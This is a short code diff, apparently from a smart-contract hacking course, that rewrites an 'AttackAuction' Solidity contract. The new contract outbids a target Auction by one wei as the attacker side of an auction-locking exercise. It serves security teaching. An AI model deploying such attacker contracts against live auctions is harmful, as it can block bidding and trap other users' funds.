@@ -1,12 +1,19 @@
-//SPDX-License-Identifier: MIT
+// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
+// https://smartcontractshacking.com/#copyright-policy
+// SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-interface IAuction {
-    function bid() external payable;
-}
+import {Auction} from "./Auction.sol";
 
 contract AttackAuction {
-    function attack(address _auction) external payable {
-        IAuction(_auction).bid{value: msg.value}();
+    Auction auction;
+
+    constructor(address _auction) {
+        auction = Auction(_auction);
+    }
+
+    function attack() external {
+        uint256 highestBid = auction.highestBid();
+        auction.bid{value: highestBid + 1}();
     }
 }
